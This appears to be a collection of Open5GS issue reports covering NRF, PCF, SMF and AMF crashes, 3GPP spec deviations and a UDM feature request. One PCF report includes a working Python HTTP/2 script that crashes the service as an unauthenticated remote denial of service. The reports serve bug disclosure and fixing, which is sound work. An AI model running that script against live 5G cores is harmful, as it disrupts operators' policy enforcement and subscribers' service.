   #    phase 2: discovery GET answered with TCP EOF; VERDICT: REPRODUCED
   docker inspect -f '{{.State.Status}} exit={{.State.ExitCode}} oom={{.State.OOMKilled}}' nrf
   # -> exited exit=134 oom=false
   docker logs nrf 2>&1 | tail -25
   ```


### Logs

```shell
`docker logs nrf` — the pool running dry and the abort on the discovery request:


10/11 12:35:55.641: [nrf] INFO: Setup NF EndPoint(addr) [10.9.9.9:1043] (../src/nrf/nnrf-handler.c:665)
10/11 12:35:55.641: [nrf] INFO: [3f9960ae-c52d-41f1-848e-4100b77dfca7] Subscription created until 2026-10-12T12:35:55.641465+08:00 [duration:86400000000,validity:86400.000000] (../src/nrf/nnrf-handler.c:693)
10/11 12:35:55.643: [nrf] INFO: Setup NF EndPoint(addr) [10.9.9.9:1044] (../src/nrf/nnrf-handler.c:665)
10/11 12:35:55.643: [nrf] INFO: [3f99aabe-c52d-41f1-848e-4100b77dfca7] Subscription created until 2026-10-12T12:35:55.643407+08:00 [duration:86400000000,validity:86400.000000] (../src/nrf/nnrf-handler.c:693)
10/11 12:35:55.644: [sbi] ERROR: No memory in client_pool (../lib/sbi/client.c:117)
10/11 12:35:55.645: [nrf] ERROR: ogs_sbi_client_add() failed (../src/nrf/nnrf-handler.c:652)
10/11 12:35:55.646: [sbi] ERROR: No memory in client_pool (../lib/sbi/client.c:117)
10/11 12:35:55.646: [nrf] ERROR: ogs_sbi_client_add() failed (../src/nrf/nnrf-handler.c:652)
10/11 12:35:55.648: [sbi] ERROR: No memory in client_pool (../lib/sbi/client.c:117)
10/11 12:35:55.648: [nrf] ERROR: ogs_sbi_client_add() failed (../src/nrf/nnrf-handler.c:652)
10/11 12:35:55.650: [sbi] ERROR: No memory in client_pool (../lib/sbi/client.c:117)
10/11 12:35:55.650: [sbi] ERROR: nf_instance_find_client: ogs_sbi_client_add() failed (../lib/sbi/context.c:2079)
10/11 12:35:55.650: [nrf] INFO: New NRF [fqdn:nrf.5gc.mnc099.mcc999.3gppnetwork.org, hnrf_uri:NULL] (../src/nrf/nnrf-handler.c:1388)
10/11 12:35:55.650: [nrf] FATAL: nrf_nnrf_handle_nf_discover: Assertion `client' failed. (../src/nrf/nnrf-handler.c:1399)
10/11 12:35:55.652: [core] FATAL: backtrace() returned 8 addresses (../lib/core/ogs-abort.c:37)
./open5gs-nrfd(+0x125bd) [0x5647453025bd]
./open5gs-nrfd(+0xa9aa) [0x5647452fa9aa]
/open5gs/install/lib/x86_64-linux-gnu/libogscore.so.2(ogs_fsm_dispatch+0x113) [0x7f50ced412bd]
./open5gs-nrfd(+0x60dc) [0x5647452f60dc]
/open5gs/install/lib/x86_64-linux-gnu/libogscore.so.2(+0x12960) [0x7f50ced31960]
/lib/x86_64-linux-gnu/libpthread.so.0(+0x8609) [0x7f50cdc3b609]
/lib/x86_64-linux-gnu/libc.so.6(clone+0x43) [0x7f50ce1eb353]
/open5gs_init.sh: line 102:    16 Aborted                 (core dumped) ./open5gs-nrfd
```

### Expected behaviour

Pool exhaustion must be answered the way the subscription path already answers it — an HTTP error with cleanup — and discovery must take the graceful branch (the NRF's own `504 No SEPP`) instead of asserting on the NULL client. The process must never terminate on request volume or content.

### Observed Behaviour

Of the 49 requests, the 48 subscription POSTs drain the pool (`201` until it is dry, then `500 "No SBI client available"`; histogram `{201: 45, 500: 3}`) and the single inter-PLMN discovery GET is answered with a TCP EOF. The NRF aborts at the assertion in `src/nrf/nnrf-handler.c:1399` (`exit=134`, `oom=false`); every registered NF instance de-registers and the core stays degraded until the NRF is restarted manually. Both negative controls leave it alive.

### eNodeB/gNodeB

_No response_

### UE Models and versions

_No response_

items.title: [Bug]: PCF crash — ogs_assert(psi != OGS_NAS_PDU_SESSION_IDENTITY_UNASSIGNED) in pcf_sess_add reachable via JSON parse-failure race
items.body:
### Open5GS Release, Revision, or Tag

v2.7.6 (crash reproduced); confirmed still present in v2.8.0 and latest `main` (`src/pcf/context.c`, `pcf_sess_add()` — `ogs_assert(psi != OGS_NAS_PDU_SESSION_IDENTITY_UNASSIGNED)` still present as of 2026-11).

### Steps to reproduce

1. Deploy Open5GS PCF (ASan build) with NRF/UDR running and PCF registered. PCF listens on SBI port 7777 (h2c).
2. On a single HTTP/2 connection, send two requests back-to-back **without waiting for the first response**:
   - Request A: `POST /npcf-policyauthorization/v1/app-sessions` with a malformed `ascReqData` body (missing `suppFeat` / `notifUri`) → JSON parse fails in `OpenAPI_app_session_context_req_data_parseFromJSON()`.
   - Request B: `POST /npcf-smpolicycontrol/v1/sm-policies` with a valid body (`supi: imsi-001010000000099`, `pduSessionId: 5`).

```python
import h2.connection, h2.config, socket, json, time

TARGET = ("<PCF_IP>", 7777)

def send_h2_request(sock, conn, path, body_dict, stream_id):
    headers = [
        (':method', 'POST'), (':path', path),
        (':scheme', 'http'), (':authority', f'{TARGET[0]}:{TARGET[1]}'),
        ('content-type', 'application/json'),
    ]
    conn.send_headers(stream_id, headers)
    conn.send_data(stream_id, json.dumps(body_dict).encode(), end_stream=True)
    sock.sendall(conn.data_to_send())

malformed_app_session = {"ascReqData": {"ueIpv4": "10.45.0.2"}}
sm_policy = {
    "supi": "imsi-001010000000099", "pduSessionId": 5,
    "pduSessionType": "IPV4", "dnn": "internet",
    "notificationUri": "http://172.29.0.100:9090/sm-notify",
    "sliceInfo": {"sst": 1},
    "servingNetwork": {"mcc": "001", "mnc": "01"},
    "ipv4Address": "10.45.0.2",
}

sock = socket.create_connection(TARGET)
config = h2.config.H2Configuration(client_side=True, header_encoding='utf-8')
conn = h2.connection.H2Connection(config=config)
conn.initiate_connection()
sock.sendall(conn.data_to_send())

send_h2_request(sock, conn, "/npcf-policyauthorization/v1/app-sessions",
                malformed_app_session, stream_id=1)
send_h2_request(sock, conn, "/npcf-smpolicycontrol/v1/sm-policies",
                sm_policy, stream_id=3)
time.sleep(2)
```

3. PCF aborts on `ogs_assert(psi != OGS_NAS_PDU_SESSION_IDENTITY_UNASSIGNED)`.

Mechanism: request A's parse failure and error response leave the SBI message-decode state polluted; request B is dispatched while `message.SmPolicyContextData` is non-NULL but its `pdu_session_id` field holds an uninitialized zero value. The zero value bypasses the outer `if (... && message.SmPolicyContextData->pdu_session_id)` check and reaches `pcf_sess_add(pcf_ue_sm, 0)` where the assert fires. Reproduced 3 times by independent fuzzing instances; triggered twice within 42 minutes of testing.

### Logs

```
[core] ERROR: OpenAPI_app_session_context_req_data_parseFromJSON() failed [supp_feat]
[sbi]  ERROR: JSON parse error
[pcf]  ERROR: cannot parse HTTP message (../src/pcf/pcf-sm.c:91)
[core] ERROR: OpenAPI_app_session_context_req_data_parseFromJSON() failed [notif_uri]
[sbi]  ERROR: parse_content() failed
[pcf]  ERROR: cannot parse HTTP message (../src/pcf/pcf-sm.c:91)
[pcf]  FATAL: pcf_sess_add: Assertion `psi != OGS_NAS_PDU_SESSION_IDENTITY_UNASSIGNED' failed.
               (../src/pcf/context.c:505)
```

ASan:

```
==1==ERROR: AddressSanitizer: SEGV on unknown address
    #0 abort
    #1 ogs_abort ../lib/core/ogs-abort.c:47
    #2 pcf_sess_add ../src/pcf/context.c:505
    #3 pcf_state_operational ../src/pcf/pcf-sm.c:228
    #4 ogs_fsm_dispatch ../lib/core/ogs-fsm.c:127
```

### Expected behaviour

The PCF should validate `pdu_session_id` before calling `pcf_sess_add()` and reply HTTP 400 for invalid values (the codebase already has an `ogs_pdu_session_id_is_valid()`-style check pattern). A request that failed JSON parsing must not leave stale/partial state that a subsequently dispatched request can observe.

### Observed Behaviour

Two rapid sequential requests on one HTTP/2 connection crash the PCF process (SIGABRT). Unauthenticated remote DoS on the SBI interface; Docker restart brings it back in ~1-3 s during which policy enforcement is down. CVSS 3.1 ≈ 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H); CWE-617 (primary), CWE-362, CWE-20 (secondary).

Note: this is different from the `ogs_assert(sess)` pool-exhaustion crash in `pcf_sess_add()` (separate report) — that one is line 508 on pool exhaustion; this one is line 505 with psi=0 via a parse-failure race.

### Suggested fix

Validate before add, and demote the assert:

```c
/* pcf_state_operational(), before pcf_sess_add() */
if (message.SmPolicyContextData->pdu_session_id ==
        OGS_NAS_PDU_SESSION_IDENTITY_UNASSIGNED ||
    message.SmPolicyContextData->pdu_session_id >
        OGS_MAX_NUM_OF_PDU_SESSION) {
    ogs_error("[%s] Invalid pduSessionId [%d]",
              message.SmPolicyContextData->supi,
              message.SmPolicyContextData->pdu_session_id);
    ogs_assert(true == ogs_sbi_server_send_error(stream,
        OGS_SBI_HTTP_STATUS_BAD_REQUEST,
        &message, "Invalid pduSessionId", NULL, NULL));
    break;
}
```

And in `pcf_sess_add()`, replace the `ogs_assert(psi != ...)` with a graceful `return NULL` since the function is reachable from external input.

### eNodeB/gNodeB

N/A

### UE Models and versions

N/A

items.title: [Bug]: AMF treats the GUTI allocated in the initial Registration Accept as unknown and requests SUCI after reconnection
items.body:
Hi Open5GS team,

According to [[TS 24.501 V19.8.0 §5.5.1.2.8(g)](https://www.etsi.org/deliver/etsi_ts/124500_124599/124501/19.08.00_60/ts_124501v190800p.pdf#page=413)](https://www.etsi.org/deliver/etsi_ts/124500_124599/124501/19.08.00_60/ts_124501v190800p.pdf#page=413), when the AMF receives a mobility registration update while awaiting Registration Complete, it shall consider the GUTI allocated during initial registration valid and proceed with the registration update. In these experiments, even when the request carries SUCI and resolves to the existing UE context, the AMF directly restarts authentication through the branch that handles requests while awaiting Complete, leaving the allocated GUTI pending confirmation. This violates the requirement to consider that GUTI valid.

After initial registration reaches Registration Accept, the UE has received the GUTI allocated by the AMF. With Registration Complete deferred, a subsequent mobility Registration Request using this GUTI produces an `Unknown UE` lookup result. Following connection release and reconnection, the AMF creates a second UE context and sends an Identity Request asking for SUCI.

With the same preceding sequence, an update request explicitly carrying SUCI resolves to the original UE context. The following four experiments compare the identity type and connection handling.

## Environment

- seqTest VM running Ubuntu 20.04.6 LTS.
- Open5GS commit used in the experiments: `51ee7ca07abd9db7a56e2b0608f5406a1dfab057`.
- Official `main` source reviewed on October 31, 2026: `b60aad44e71b3f62c93440992a8b18cb67953c87`.
- Instrumented UERANSIM based on test revision `729c0ac`. A dedicated test switch bypasses the adapter’s automatic conversion of ordinary registration requests to GUTI-based requests, allowing the SUCI cases to use the original registration sending path.
- Test PLMN: 999/70. UE: `imsi-999700000000002`. Security algorithms: NEA0/NIA2. Native ngKSI: 0.
- Each case starts with fresh core-network and UE contexts. Captured evidence includes complete uplink NAS messages, downlink messages before tester filtering, and AMF logs.

## Steps to reproduce

Execute the following common sequence:

```text
registrationRequest
authenticationResponse
securityModeComplete
```

The corresponding responses are Authentication Request, Security Mode Command, and Registration Accept. Let G0 denote the GUTI allocated in that Accept. Defer Registration Complete.

Approximately one second after receiving Accept, execute one of these four cases:

1. **GUTI, existing connection:** Execute `registrationRequestGUTI` over the existing UE-associated NG connection.
2. **GUTI, release and reconnect:** Complete connection release through an NG-RAN-initiated UE Context Release Request, then execute `registrationRequestGUTI` through a new InitialUEMessage.
3. **SUCI, existing connection:** Execute `registrationRequest` using the SUCI template over the existing connection.
4. **SUCI, release and reconnect:** Complete the same connection release, then execute `registrationRequest` using the SUCI template.

The fourth request has registration type 2, mobility registration updating, in all four cases. Both GUTI cases carry G0 from their respective Registration Accept.

Requests over the existing connection use SHT 2; requests after reconnection use SHT 1. Their security protection is generated using the established NAS security context. Observe each case for eight seconds after the fourth request.

## Actual results

- **GUTI, existing connection:** The lookup for G0 reports `Unknown UE`. The AMF uses the existing NG association to enter authentication and sends Authentication Request.
- **GUTI, release and reconnect:** Both the NGAP S-TMSI lookup and the NAS GUTI lookup report `Unknown UE`. The AMF UE count increases from 1 to 2, and the AMF sends Identity Request asking for SUCI.
- **SUCI, existing connection:** The AMF logs `known UE by SUCI` and sends Authentication Request using the original UE context.
- **SUCI, release and reconnect:** The NGAP S-TMSI lookup reports `Unknown UE`. The NAS SUCI lookup resolves to the original UE context, and the AMF sends Authentication Request. The AMF UE count remains 1.

In the GUTI release-and-reconnect case, the complete mobile identity is `F299F907020040C00000B3`. This value appears in both Registration Accept and the subsequent Registration Request. The AMF logs:

```text
UE Context Release [Action:2]
Unknown UE by 5G-S_TMSI[AMF_ID:0x20040,M_TMSI:0xc00000b3]
Unknown UE by 5G-S_TMSI[AMF_ID:0x20040,M_TMSI:0xc00000b3]
[Added] Number of AMF-UEs is now 2
```

The subsequent downlink NAS message is `7E005B01`, an Identity Request asking for SUCI.

## Specification and expected behavior

Open5GS declares support for Release 19. [[TS 24.501 V19.8.0 §5.5.1.2.8(g), printed page 412 / PDF page 413](https://www.etsi.org/deliver/etsi_ts/124500_124599/124501/19.08.00_60/ts_124501v190800p.pdf#page=413)](https://www.etsi.org/deliver/etsi_ts/124500_124599/124501/19.08.00_60/ts_124501v190800p.pdf#page=413) requires the AMF, upon receiving a mobility or periodic Registration Request while awaiting the expected Registration Complete, to:

- Stop T3550.
- Consider the GUTI allocated during initial registration valid.
- Proceed with mobility or periodic registration updating according to §5.5.1.3.

Case (a) of the same clause also specifies that a lower-layer failure while awaiting Complete with T3550 running requires the AMF to abort initial registration locally, enter 5GMM-REGISTERED, and consider both the old and new GUTIs allocated by this AMF valid until the specified invalidation conditions apply.

G0 should resolve to the existing UE context. Its validity should support the registration update and subsequent connection recovery. Authentication may be performed as a common procedure during the registration update.

items.title: [Feature]: UDM GetHssAv (IMS-AKA vectors for an HSS, TS 29.503 clause 5.4.2.4)
items.body:
### Open5GS Release, Revision, or Tag

main 51ee7ca (2026-10-26)

### Steps to reproduce

POST /nudm-ueau/v1/{supi}/hss-security-information/ims-aka/generate-av with `{"hssAuthType": "IMS_AKA", "numOfRequestedVectors": 1}`.

### Logs

The path is not served (no handler for `hss-security-information` in `src/udm`).

### Expected behaviour

Nudm_UEAU GetHssAv returns IMS-AKA vectors {RAND, XRES, AUTN, CK, IK} (TS 29.503 clause 5.4.2.4). It is the operation an HSS, or a Cx interworking function acting as one in the HSS/UDM coexistence architecture of TS 23.632, uses for IMS registration (Cx MAR).

### Observed Behaviour

Without it, an IMS core in front of Open5GS can only use the AUSF's 5G-AKA operation (generate-auth-data). That vector carries XRES* and K_AUSF but no CK/IK, so a P-CSCF cannot key IPsec with standard IMS-AKA, and the AUSF's result confirmation (auth-events) is never sent, so the SQN in the UDR is not advanced between IMS registrations and the same AUTN is reused.

For reference, an implementation of GetHssAv for free5GC's UDM is proposed in https://github.com/free5gc/udm/pull/104; it builds UMTS AVs with Milenage (AMF separation bit cleared), advances the SQN in the UDR per vector, and supports AUTS re-synchronisation.

### eNodeB/gNodeB

Not involved.

### UE Models and versions

IMS UE simulator with standard IMS-AKA (RES, CK/IK).

items.title: [Bug]: SMF aborts on PFCP Session Deletion timeout when the associated SBI stream is gone (sess_5gc_timeout: Assertion 'stream' failed)
items.body:
### Summary

When a PFCP Session Deletion Request times out (`No PFCP session deletion response`) and the associated SBI stream has already been released, `sess_5gc_timeout()` in `src/smf/pfcp-path.c` hits `ogs_assert(stream)` and **aborts the whole SMF process**. On restart the SMF loses all in-memory UE address allocations, which leads to duplicate UE IP assignment and broken downlink for roughly half of the (re)attached sessions. Under session churn (mass UE attach/detach) this can become a self-feeding crash loop (crash → reconciliation → more deletion timeouts → crash again).

This is the sibling of #2085 (which fixed the same pattern for the **modification** timeout path); the **deletion** path was left unguarded.

### Environment

- open5gs commit `f87da618b5896f57c3a2bacc7e011974403c4d28` — still present on `main` as of 2026-10-03
- N4 peer: eUPF (edgecomllc/eupf), ~600–1100 simulated UEs on the same host
- Lab rig with heavy session churn; open5gs SMF restarted 4–6 times within one afternoon, every restart triggered by this assert

### Evidence

```
[pfcp] WARNING: [1289] LOCAL No Reponse. Give up! for step 1 type 54 peer [172.22.0.8]:8805 (../lib/pfcp/xact.c:640)
[smf]  ERROR: [imsi-001010000082236:2] No PFCP session deletion response[7] (../src/smf/pfcp-path.c:330)
[smf]  FATAL: sess_5gc_timeout: Assertion `stream' failed. (../src/smf/pfcp-path.c:341)
[core] FATAL: backtrace() returned 8 addresses (../lib/core/ogs-abort.c:37)
./open5gs-smfd(+0x4f730) ...
```

### Root cause

`src/smf/pfcp-path.c`, `sess_5gc_timeout()`:

```c
} else if (trigger == OGS_PFCP_DELETE_TRIGGER_UE_REQUESTED ||
        trigger == OGS_PFCP_DELETE_TRIGGER_AMF_UPDATE_SM_CONTEXT ||
        trigger == OGS_PFCP_DELETE_TRIGGER_AMF_RELEASE_SM_CONTEXT) {

    ogs_assert(stream);               /* <-- stream may be NULL */
    ogs_assert(true ==
        ogs_sbi_server_send_error(stream,
            OGS_SBI_HTTP_STATUS_GATEWAY_TIMEOUT, NULL, strerror,
            NULL, NULL));
}
```

`stream` comes from `ogs_sbi_stream_find_by_id(xact->assoc_stream_id)`. If the AMF-side SBI stream was released while the PFCP transaction was still pending (AMF gave up / UE context cleaned up during churn), the lookup returns NULL and the assert aborts the process. The modification branch a few lines above already guards with `if (stream)`, so this looks like an oversight rather than intentional behavior.

### Suggested fix

Handle the NULL stream gracefully — report 504 only when the stream is still alive, otherwise log and continue with the existing `SMF_EVT_N4_TIMER` cleanup below:

```c
if (stream) {
    ogs_assert(true ==
        ogs_sbi_server_send_error(stream,
            OGS_SBI_HTTP_STATUS_GATEWAY_TIMEOUT, NULL, strerror,
            NULL, NULL));
} else {
    ogs_warn("No SBI stream for PFCP deletion timeout [%d]", trigger);
}
```

### Verification of the fix

We applied exactly this change to our local build and re-ran the scenario: full stack reset + a one-shot 600-UE attach/detach churn plus mass UE kills. **SMF restart count stayed 0 through the whole run** (previously 4–6 crashes per run), with clean 1:1 UE IP allocation. A PR can be provided if helpful.

### Notes

- The timeout itself can also be triggered by a UPF not answering some deletions; that part is being reported separately to eUPF (edgecomllc/eupf). Regardless of peer behavior, the SMF should not abort on this path.

items.body:
### Open5GS Release, Revision, or Tag

Reproduced on current `main`, commit `51ee7ca07abd9db7a56e2b0608f5406a1dfab057`, built and tested on 2026-10-27 (Ubuntu 20.04.6 LTS, Linux 5.15). Also observed previously on v2.6.6, commit `499c70d8be63e5f87c2d1c2bcd4e521d50ce1a6b`.

### Summary

While an initial registration is pending and the AMF is waiting for Identity Response, sending the **same initial Registration Request again on the same UE-associated NG connection** immediately causes another Identity Request and resets T3570 and its retransmission counter. The duplicate request has identical NAS bytes, including all IEs. No Identity Response is sent.

TS 24.501 requires the network to ignore the identical second request and continue the previous registration procedure in this situation.

### Steps to reproduce

1. Start the AMF with the default T3570 duration of 3 seconds and establish a gNB connection.
2. On a fresh UE context, send a plain initial Registration Request containing an unknown 5G-GUTI. In this test the complete NAS PDU was:

   ```text
   7E004179000BF299F907000000000000002E04F0F0F0F0
   ```

   The registration type is initial registration (1), identity type is 5G-GUTI (2), native ngKSI is 7, and the security header type is plain (0). The test PLMN is 999/70.
3. Receive Identity Request (`7E005B01`, requesting SUCI). Do not send Identity Response, and keep the same connection.
4. At approximately 3.511 seconds after the first captured Identity Request, send **exactly the NAS PDU from step 2** using Uplink NAS Transport on the existing connection. Do not send a new InitialUEMessage, release/reconnect the UE, change any IE, or send any other NAS input.
5. Observe the downlink NAS PDUs and the eventual identification failure. In an independent control run, perform steps 1–3 and then remain silent without sending the duplicate request.

The simulator records actual NAS submission to RRC and captures downlink NAS before duplicate-output filtering. Both requests were actually submitted. The second submission has `initial_nas_cm_state=CM-CONNECTED`, `initial_nas_release_attempted=false`, and `initial_nas_identity_refreshed=false`. The AMF log shows one InitialUEMessage and the same AMF/RAN UE context; there is no context release or lower-layer failure between the two requests.

### Observed Behaviour

Times below are relative to the **first captured Identity Request**, independently in each run. This differs from the command-call time; the UE adapter takes approximately 0.5 seconds to submit the requested NAS message.

Control run: Identity Request at 0.000, 3.002, 6.003, 9.003, 12.005 seconds, **5 total** (initial plus 4 retries). The AMF aborts identification at approximately 15 seconds.

With the identical second Registration Request submitted at **3.511 seconds**:

| Time (s) | Downlink NAS | Observation |
|---|---|---|
| 0.000 | Identity Request (`7E005B01`) | First Identity Request |
| 3.001 | Identity Request (`7E005B01`) | Original-round retry |
| 3.511 | Identity Request (`7E005B01`) | New initial Identity Request immediately after duplicate RR |
| 6.513 | Identity Request (`7E005B01`) | Retry after the duplicate RR |
| 9.514 | Identity Request (`7E005B01`) | Retry after the duplicate RR |
| 12.516 | Identity Request (`7E005B01`) | Retry after the duplicate RR |
| 15.517 | Identity Request (`7E005B01`) | Retry after the duplicate RR |

There are **7 Identity Requests total**: the original initial message and its first retry, followed by an immediate new initial message and four more retries. Identification failure/context release occurs at approximately 18.52 seconds instead of approximately 15 seconds. The timer is reset; this is not two concurrent T3570 instances.

The test adapter's abstract output for the duplicate input is `null_action` because it suppresses identical downlink PDUs. The unfiltered capture above and the AMF log establish the actual behavior; the conclusion is not based on that abstract output.

### Logs

Relevant AMF excerpt from the current-main reproduction (timestamps as recorded by the AMF):

```text
10/27 05:35:18.432: [amf] INFO: InitialUEMessage (../src/amf/ngap-handler.c:668)
10/27 05:35:18.432: [amf] INFO: [Added] Number of gNB-UEs is now 1 (../src/amf/context.c:3064)
10/27 05:35:18.432: [amf] INFO:     RAN_UE_NGAP_ID[1] AMF_UE_NGAP_ID[1] TAC[1] CellID[0x10] (../src/amf/ngap-handler.c:894)
10/27 05:35:18.432: [amf] INFO: Unknown UE by 5G-S_TMSI[AMF_ID:0x0,M_TMSI:0x0] (../src/amf/context.c:2093)
10/27 05:35:18.432: [amf] INFO: [Added] Number of AMF-UEs is now 1 (../src/amf/context.c:1821)
10/27 05:35:18.432: [gmm] INFO: Registration request (../src/amf/gmm-sm.c:1719)
10/27 05:35:18.432: [gmm] INFO: [Unknown ID]    5G-S_GUTI[AMF_ID:0x0,M_TMSI:0x0] (../src/amf/gmm-handler.c:204)
10/27 05:35:21.944: [gmm] INFO: Registration request (../src/amf/gmm-sm.c:1719)
10/27 05:35:21.944: [gmm] INFO: [Unknown ID]    5G-S_GUTI[AMF_ID:0x0,M_TMSI:0x0] (../src/amf/gmm-handler.c:204)
10/27 05:35:21.944: [amf] WARNING: GUTI has already been allocated (../src/amf/context.c:1616)
10/27 05:35:36.951: [gmm] WARNING: Retransmission of Identity-Request failed. Stop retransmission (../src/amf/gmm-sm.c:171)
10/27 05:35:36.951: [amf] INFO: UE Context Release [Action:3] (../src/amf/ngap-handler.c:2072)
10/27 05:35:36.951: [amf] INFO:     RAN_UE_NGAP_ID[1] AMF_UE_NGAP_ID[1] (../src/amf/ngap-handler.c:2073)
10/27 05:35:36.951: [amf] INFO:     SUCI[Unknown] (../src/amf/ngap-handler.c:2077)
```

### Expected behaviour

For an identical initial Registration Request received while identification triggered by a pending initial registration is ongoing, ignore the duplicate request and continue the previous procedure. The duplicate should not restart identification or reset T3570/the retry budget.

[3GPP TS 24.501 V17.9.0](https://www.etsi.org/deliver/etsi_ts/124500_124599/124501/17.09.00_60/ts_124501v170900p.pdf):

- **Section 5.4.3.6(d), p.230** specifically covers a new initial/emergency Registration Request received during identification caused by a pending initial registration. If its IEs are unchanged, the network must not further process the new request.
- **Section 5.5.1.2.8(e), pp.324–325** covers multiple initial Registration Requests before any Registration Accept/Reject is sent. If the IEs are unchanged, the network must continue the previous registration and ignore the second request.

Requests with changed IEs, mobility/periodic registration updates, and duplicates received after Registration Accept are different cases and are outside this report.

### Source analysis

The observed reset matches the current-main code:

1. [`gmm_handle_registration_request()`](<https://github.com/open5gs/open5gs/blob/51ee7ca07abd9db7a56e2b0608f5406a1dfab057/src/amf/gmm-handler.c#L280-L289>) clears all UE timers after accepting the request.
2. The [missing-SUCI branch in `common_register_state()`](<https://github.com/open5gs/open5gs/blob/51ee7ca07abd9db7a56e2b0608f5406a1dfab057/src/amf/gmm-sm.c#L1785-L1790>) clears T3570 and sends Identity Request again.
3. [`CLEAR_AMF_UE_TIMER`](<https://github.com/open5gs/open5gs/blob/51ee7ca07abd9db7a56e2b0608f5406a1dfab057/src/amf/context.h#L721-L729>) stops the timer, frees the cached PDU, and sets `retry_count = 0`.
4. [`nas_5gs_send_identity_request()`](<https://github.com/open5gs/open5gs/blob/51ee7ca07abd9db7a56e2b0608f5406a1dfab057/src/amf/nas-path.c#L443-L462>) builds/caches the request and starts T3570 again.

I could not find a check on this path that ignores a duplicate initial Registration Request with unchanged IEs while identification is pending. Please let me know if another applicable specification rule permits this behavior.

The demonstrated effect is the extra Identity Request, restarted retransmission budget, and delayed procedure termination after one identical duplicate. This report does not claim an AMF crash, authentication bypass, or demonstrated denial of service.

### eNodeB/gNodeB

Instrumented UERANSIM gNB, test PLMN 999/70. Local test-harness revision `729c0ac` (`timer-alphabet-demo-20261026`). Both runs used the same simulator build and fresh, independent core/UE contexts.

### UE Models and versions

Instrumented UERANSIM UE from the same revision. It supports explicitly sending the repeated Registration Request while withholding Identity Response, captures complete downlink NAS before output filtering, and records actual uplink NAS submission timestamps. The exact NAS PDUs and event timings needed to reproduce the issue are included above.

labels.name: status:already-fixed
